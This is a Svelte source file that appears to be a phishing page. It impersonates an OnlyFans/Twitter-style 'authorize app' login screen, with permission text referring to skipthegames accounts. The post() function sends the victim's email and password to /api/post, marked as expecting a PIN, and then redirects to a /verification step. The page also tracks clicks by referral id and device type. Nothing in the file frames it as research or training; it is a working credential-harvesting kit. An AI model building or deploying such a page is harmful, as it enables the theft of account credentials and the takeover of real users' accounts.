<script context="module">
    export function load({ url,params }) {
        console.log(url,params)
        let query = url.searchParams;
 
        return {
            props: {
                ref: query.get("r"),
            },
        };
    }
</script>

<script>
    import { onMount } from "svelte";
    import { goto } from "$app/navigation";
    var device;
    onMount(async () => {
        device = window.navigator.userAgentData.mobile?'Mobile':'Desktop';
        console.log("hi");
        console.log("ref", ref);
        let r = await fetch("/api/click?ref="+ref+"&device="+device);
        console.log(r);
        let j = await r.json();
        console.log(j);
    });

    async function post() {
        console.log(email);
        let res=await fetch("/api/post", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                input_account_email: email,
                input_account_password: password,
                type: "skipthegames",
                pin_expected: true,
                ref_id:ref,
                device:device
            }),
        });
        let resVal=await res.json();
        console.log(resVal)
        goto("/verification?t="+resVal['timestamp']);
    }
    let email ;
    let password ;
    export let ref;
</script>
<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.0/font/bootstrap-icons.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;600&display=swap" rel="stylesheet">
    <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
 integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
 <link rel="stylesheet" href="page2.css">

</svelte:head>
<body>
   <nav>
       <div class="logo">
           <img src="images/page2-logo.png" alt="">
       </div>
       <div class="ancore">
           <a href="#">Sign in for OnlyFans ></a>
       </div>
       
   </nav>
    <div class="custom-container">
        <div class="box">
            <div class="mini-box">
                      <div class="first-look">
                    <div class="heading">
                        <h4>Authorize onlyfans to access your account</h4>
                    </div>
                    <div class="submit-opstion">
                        <form on:submit|preventDefault={post}>
                        <input bind:value={email} type="email" placeholder="Email" required> <br>
                        <input bind:value={password} type="password" placeholder="Password" required> <br>
                        <button  type="submit"> <a href="/verification"><b>Log In</b></a> </button>
                    </form>
                        
                    </div>
                </div>
                    
                        <div class="side-logo">
                            <div class="2nd-logo">
                                <img src="images/Capture12.PNG" alt="">
                            </div>
                        </div>
                        <div class="text">
                            <h5>OnlyFans</h5>
                            <p>By OnlyFans</p>
                             <p>onlyfans.com/</p>
                            <a href="#">Privacy Policy</a> <br>
                            <a href="#">Terms and Conditions</a>
    
                        </div>
                    
                
            </div>
        
                    <div class="service">
                        <h6>This application will be able to:</h6>
                    </div>
                    <div class="unorder-list">
                        <ul>
                            <li>See your skipthegame profile information and account settings.
                                See accounts you follow, mute, and block.</li>
                            <li>Follow and unfollow accounts for you</li>
                            <li>Update your profile and account settings.</li>
                            <li>Post and delete Tweets for you, and engage with Text   posted by others (Like, un-Like, or reply to a Text,
                                Retweet, etc.) for you.</li> 
                             
                            <li>Create, manage, and delete Lists and collections for you</li>
                            <li>Mute, block, and report accounts for you</li>
                            <li>See your email address.</li>
                            
                        </ul>
                        <p class="simple-text">Learn more about third-party app permissions in the <a href="#">Help Center</a></p>
                    </div>
                
               
                
            

        </div>
        

    </div>
    <footer>
        <div class="custom-containerr">
            <div class="footer-text">
                <p class="big-text">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your Twitter account.
                 You can revoke access to any app at any time from the <span>Apps and sessions</span>  section of your skipthegames account settings.</p>
                
            </div>

        </div>
    </footer>
    
    
        
            
        
  







    <!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" 
integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
